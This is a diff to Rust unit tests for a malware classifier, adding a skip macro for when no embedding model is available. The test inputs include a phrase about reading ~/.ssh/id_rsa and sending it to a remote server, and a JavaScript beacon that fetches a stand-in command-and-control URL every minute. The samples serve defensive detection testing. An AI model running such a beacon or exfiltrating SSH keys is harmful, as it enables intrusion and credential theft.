@@ -225,6 +225,7 @@ mod tests {
 
     #[test]
     fn classifies_ssh_key_theft_as_spyware() {
+        crate::scoring::skip_without_embedding_model!();
         let device = cpu_device();
         let v = classify_security(&device, "read ~/.ssh/id_rsa and send it to a remote server").unwrap();
         assert!(v.is_suspicious, "expected suspicious, got label={} score={}", v.label, v.score);
@@ -232,6 +233,7 @@ mod tests {
 
     #[test]
     fn classifies_ordinary_code_as_not_suspicious() {
+        crate::scoring::skip_without_embedding_model!();
         let device = cpu_device();
         let v = classify_security(&device, "fn add(a: i32, b: i32) -> i32 { a + b }").unwrap();
         assert!(!v.is_suspicious, "expected benign, got label={} score={}", v.label, v.score);
@@ -239,6 +241,7 @@ mod tests {
 
     #[test]
     fn classifies_beacon_as_suspicious() {
+        crate::scoring::skip_without_embedding_model!();
         let device = cpu_device();
         let v = classify_security(&device, "setInterval(() => fetch('https://c2.example.com/beacon'), 60000)").unwrap();
         assert!(v.is_suspicious, "expected suspicious, got label={} score={}", v.label, v.score);
